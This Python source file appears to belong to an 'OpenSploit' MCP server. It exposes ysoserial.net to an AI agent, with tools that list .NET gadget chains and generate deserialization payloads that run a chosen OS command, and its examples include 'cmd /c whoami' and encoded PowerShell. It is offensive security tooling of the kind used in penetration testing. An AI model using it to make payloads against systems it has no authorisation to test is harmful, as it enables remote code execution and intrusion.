#!/usr/bin/env python3
"""
OpenSploit MCP Server: ysoserial

.NET deserialization gadget chain generator via ysoserial.net.
Generates serialized payloads for BinaryFormatter, JavaScriptSerializer,
Json.NET, SoapFormatter, and many more .NET formatters.
"""

import asyncio
import base64
import re
from typing import Any, Dict, List, Optional

from mcp_common import BaseMCPServer, ToolResult, ToolError, sanitize_output

YSOSERIAL_PATH = "/opt/ysoserial/Release/ysoserial.exe"


class YsoserialServer(BaseMCPServer):
    """MCP server wrapping ysoserial.net for .NET deserialization payload generation."""

    def __init__(self):
        super().__init__(
            name="ysoserial",
            description=".NET deserialization gadget chain generator via ysoserial.net",
            version="1.36",
        )

        self.register_method(
            name="list_gadgets",
            description="List all available .NET gadget chains with their supported formatters",
            params={},
            handler=self.list_gadgets,
        )

        self.register_method(
            name="list_formatters",
            description="List all available .NET serialization formatters",
            params={},
            handler=self.list_formatters,
        )

        self.register_method(
            name="generate",
            description="Generate a serialized .NET deserialization payload",
            params={
                "gadget": {
                    "type": "string",
                    "required": True,
                    "description": "Gadget chain name (e.g., 'WindowsIdentity', 'TypeConfuseDelegate', 'TextFormattingRunProperties', 'ObjectDataProvider')",
                },
                "formatter": {
                    "type": "string",
                    "required": True,
                    "description": "Serialization formatter (e.g., 'Json.Net', 'BinaryFormatter', 'JavaScriptSerializer', 'SoapFormatter', 'LosFormatter')",
                },
                "command": {
                    "type": "string",
                    "required": True,
                    "description": "OS command to execute (e.g., 'calc', 'cmd /c whoami', 'powershell -e <base64>')",
                },
                "output_format": {
                    "type": "string",
                    "enum": ["raw", "base64", "hex"],
                    "default": "base64",
                    "description": "Output format: raw (binary), base64, hex",
                },
                "minify": {
                    "type": "boolean",
                    "default": False,
                    "description": "Minify the output (remove whitespace from JSON/XML formatters)",
                },
                "test": {
                    "type": "boolean",
                    "default": False,
                    "description": "Test mode — run the payload locally to verify it works (WARNING: executes the command!)",
                },
            },
            handler=self.generate,
        )

    def _parse_gadget_list(self, output: str) -> List[Dict[str, Any]]:
        """Parse ysoserial -h output into structured gadget data."""
        gadgets = []
        current_gadget = None

        for line in output.split("\n"):
            # Gadget line: starts with tab and (*)
            gadget_match = re.match(r"\s+\(\*\)\s+(\w+)\s*(.*)", line)
            if gadget_match:
                current_gadget = {
                    "name": gadget_match.group(1),
                    "description": gadget_match.group(2).strip("[] "),
                    "formatters": [],
                }
                gadgets.append(current_gadget)
                continue

            # Formatter line: starts with double tab and "Formatters:"
            formatter_match = re.match(r"\s+Formatters:\s+(.*)", line)
            if formatter_match and current_gadget:
                formatters_str = formatter_match.group(1)
                # Parse "BinaryFormatter , LosFormatter , Json.Net" etc.
                for f in formatters_str.split(","):
                    f = f.strip()
                    # Remove count suffixes like " (2)"
                    f = re.sub(r"\s*\(\d+\)\s*$", "", f).strip()
                    if f:
                        current_gadget["formatters"].append(f)

        return gadgets

    async def list_gadgets(self) -> ToolResult:
        """List all available .NET gadget chains."""
        self.logger.info("Listing .NET gadget chains")

        cmd = ["mono", YSOSERIAL_PATH, "-h"]

        try:
            result = await self.run_command(cmd, timeout=30)
            stdout = result.stdout.strip() if result.stdout else ""

            gadgets = self._parse_gadget_list(stdout)

            return ToolResult(
                success=True,
                data={
                    "gadgets": gadgets,
                    "gadget_count": len(gadgets),
                    "gadget_names": [g["name"] for g in gadgets],
                },
                raw_output=sanitize_output(stdout, max_length=10000),
            )

        except Exception as e:
            return ToolResult(
                success=False,
                data={},
                error=f"Failed to list gadgets: {e}",
            )

    async def list_formatters(self) -> ToolResult:
        """List all available .NET serialization formatters."""
        self.logger.info("Listing .NET formatters")

        cmd = ["mono", YSOSERIAL_PATH, "-h"]

        try:
            result = await self.run_command(cmd, timeout=30)
            stdout = result.stdout.strip() if result.stdout else ""

            # Extract unique formatters from gadget list
            gadgets = self._parse_gadget_list(stdout)
            all_formatters = set()
            for g in gadgets:
                all_formatters.update(g["formatters"])

            formatters = sorted(all_formatters)

            # Map formatters to their gadgets
            formatter_gadgets = {}
            for f in formatters:
                formatter_gadgets[f] = [
                    g["name"] for g in gadgets if f in g["formatters"]
                ]

            return ToolResult(
                success=True,
                data={
                    "formatters": formatters,
                    "formatter_count": len(formatters),
                    "formatter_gadgets": formatter_gadgets,
                },
                raw_output="\n".join(
                    f"{f}: {', '.join(formatter_gadgets[f])}"
                    for f in formatters
                ),
            )

        except Exception as e:
            return ToolResult(
                success=False,
                data={},
                error=f"Failed to list formatters: {e}",
            )

    async def generate(
        self,
        gadget: str,
        formatter: str,
        command: str,
        output_format: str = "base64",
        minify: bool = False,
        test: bool = False,
    ) -> ToolResult:
        """Generate a serialized .NET deserialization payload."""
        self.logger.info(f"Generating payload: gadget={gadget} formatter={formatter} command={command}")

        cmd = [
            "mono", YSOSERIAL_PATH,
            "-g", gadget,
            "-f", formatter,
            "-c", command,
        ]

        if output_format == "raw":
            cmd.extend(["-o", "raw"])
        elif output_format == "base64":
            cmd.extend(["-o", "base64"])
        elif output_format == "hex":
            cmd.extend(["-o", "hex"])

        if minify:
            cmd.append("--minify")

        if test:
            cmd.append("--test")

        try:
            result = await self.run_command(cmd, timeout=30)
            stdout = result.stdout if result.stdout else ""
            stderr = result.stderr.strip() if result.stderr else ""

            if result.returncode != 0:
                error_msg = stderr or stdout.strip()
                # Common errors
                if "not compatible" in error_msg.lower() or "not supported" in error_msg.lower():
                    return ToolResult(
                        success=False,
                        data={"gadget": gadget, "formatter": formatter},
                        error=f"Gadget '{gadget}' is not compatible with formatter '{formatter}'. Use list_gadgets to check compatible formatters.",
                    )
                return ToolResult(
                    success=False,
                    data={"gadget": gadget, "formatter": formatter},
                    error=f"ysoserial failed: {error_msg}",
                )

            payload = stdout.rstrip("\n")

            return ToolResult(
                success=True,
                data={
                    "gadget": gadget,
                    "formatter": formatter,
                    "command": command,
                    "output_format": output_format,
                    "payload": payload,
                    "payload_length": len(payload),
                },
                raw_output=payload,
            )

        except Exception as e:
            return ToolResult(
                success=False,
                data={},
                error=f"Payload generation failed: {e}",
            )


if __name__ == "__main__":
    YsoserialServer.main()
